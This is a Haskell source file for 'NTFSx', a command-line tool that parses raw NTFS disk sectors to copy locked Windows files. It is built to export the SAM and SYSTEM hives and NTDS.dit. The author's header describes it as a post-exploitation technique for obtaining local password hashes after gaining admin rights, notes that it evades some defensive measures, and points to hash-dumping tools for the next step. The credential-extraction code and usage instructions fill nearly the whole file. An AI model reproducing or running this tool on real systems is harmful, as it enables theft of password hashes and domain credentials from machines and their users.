-- ntfsx.hs:
--
-- This is a simple implementation of a tool to copy out the SAM and
-- SYSTEM registry hives.  It relies on my NTFS parsing library, and
-- will search through the MFT for the two relevant files and export
-- them (if possible) to new files in the current directory.
--
-- The use case for this tool is in post-exploitation, after gaining
-- admin rights, in order to obtain the local password hashes from a
-- system.  I often find that having several techniques available is
-- beneficial, as some situations render other tools or techniques
-- useless.
--
-- This tool requires *administrator* rights.  Some techniques require
-- NT AUTHORITY\SYSTEM rights, which makes this potentially more
-- useful if those rights are not attainable.
--
-- SAMex does not do anything particularly dangerous (to my
-- knowledge), such as DLL injection.  It also does not rely on a
-- system configuration in terms of local services (e.g., the Volume
-- Shadow Copy service).  As such, this is a very unintrusive
-- technique for extracting the SAM and SYSTEM hives.
--
-- It is assumed that the user will be able to post-process the
-- registry hives as appropriate (I recommend bkhive and samdump2).
--
-- Author:  Josh Stone
-- Contact: yakovdk@gmail.com
-- Date:    2012-06-03
--
--

module Main where

import NTFS
import Data.Maybe
import Text.Printf
import SectorDump
import Data.List 
import Data.Char (toLower)
import Debug.Trace
import System.Environment (getArgs)
import Control.Monad

import qualified WinBlocks as WB
import MFT
import Blocker

main = do
  banner
  args <- getArgs
  n <- readNTFS 'C'
  let (MFTFrag fs) = ntMFrag n
  when (length fs > 1) $ do
    putStrLn "Note: MFT is fragmented, extraction is experimental!"
    putStrLn ""
    putStrLn "MFT Fragments:"
    putStrLn ""
    print fs
    putStrLn ""
  case args of
    ("sam":[])  -> doSAM n
    ("ntds":[]) -> doNTDS n
    (x:y:[])    -> doPath n (split '\\' x) y
    _ -> usage

doSAM n = doPair n sam system
  where sam    = (["Windows", "System32", "config", "SAM"], "SAM.out")
        system = (["Windows", "System32", "config", "SYSTEM"], "SYSTEM.out")

doNTDS n = doPair n ntds system
  where ntds   = (["Windows", "NTDS", "NTDS.dit"], "NTDS.out")
        system = (["Windows", "System32", "config", "SYSTEM"], "SYSTEM.out")

doPair n (p1,o1) (p2,o2) = do
  dumpFile n p1 o1
  dumpFile n p2 o2

split d = unfoldr iterate
  where adjust (i,j) = (i, drop 1 j)
        iterate []   = Nothing
        iterate l    = Just (adjust $ break (==d) l)

doPath n path out = do
  n <- readNTFS 'C'
  putStrLn "NOTE: this file must exist, or I won't terminate"
  putStrLn ""
  dumpFile n path out

dumpFile n path out = do
  -- sam <- huntPath n path
  sam <- multiHunt n path
  let joined = foldl1 ((++).(++ "\\")) path
  putStrLn ("Exporting " ++ joined ++ " to '" ++ out ++ "'...")
  extractFile n (nfID sam) out

extractFile n id fname = do
  (Just f) <- getFile n id
  let raw = calcMFTraw n id
  (Just mft) <- getMFTraw (ntHandle n) raw
  let hdr = mftHeader mft
  putStrLn ""
  print f
  exportRuns (ntHandle n) fname (nfSectors f)

huntPath n = huntPath' n ntfsRoot
huntPath' n p [] = return p
huntPath' n p (f:fs) = do
  putStrLn ("Searching for " ++ show f)
  (Just mft) <- huntMFT n p f
  huntPath' n (nfID mft) fs

usage = do
  putStrLn "  usage: ntfsx ( ntds | sam | [<path> <output>] )"
  putStrLn ""
  putStrLn "     <path>    Backslash-delimited path of file to extract"
  putStrLn "     <output>  EXPERIMENTAL! File to write contents to"
  putStrLn "     ntds      Export NTDS.dit to 'NTDS.out'"
  putStrLn "     sam       Export the SAM to 'SAM.out'"
  putStrLn ""
  putStrLn "  NTFSx is a generalized solution for extracting locked files in"
  putStrLn "  a Microsoft Windows environment.  If you have at least local"
  putStrLn "  administrator rights, you can open a read-only file handle for"
  putStrLn "  a storage volume.  Raw data can be read without enforcement of"
  putStrLn "  access rights, which means we can extract any file by parsing"
  putStrLn "  NTFS and reading the appropriate sectors from the disk"
  putStrLn ""
  putStrLn "  This can be very useful for extracting files like NTDS.DIT or"
  putStrLn "  files that are currently locked (e.g., MSSQL, Exchange, etc.)"
  putStrLn ""
  putStrLn "  NOTE: This code is adequate, but not efficient.  It may take"
  putStrLn "        several minutes to extract files.  Please be patient."
  putStrLn ""
  putStrLn "  NOTE: Files exported will be padded with extra bytes to the"
  putStrLn "        length defined by the NTFS run length.  This is not"
  putStrLn "        typically a problem."
  putStrLn ""
  putStrLn "        Also, I currently only extract files from the C: drive"
  putStrLn ""

banner = do
  putStrLn "-----------------------------------------------------------------"
  putStrLn "        NTFSx - www.josho.org - (C) June 2012 Josh Stone"
  putStrLn "  (This software comes with NO WARRANTY; your mileage may vary)"
  putStrLn "-----------------------------------------------------------------"
  putStrLn ""

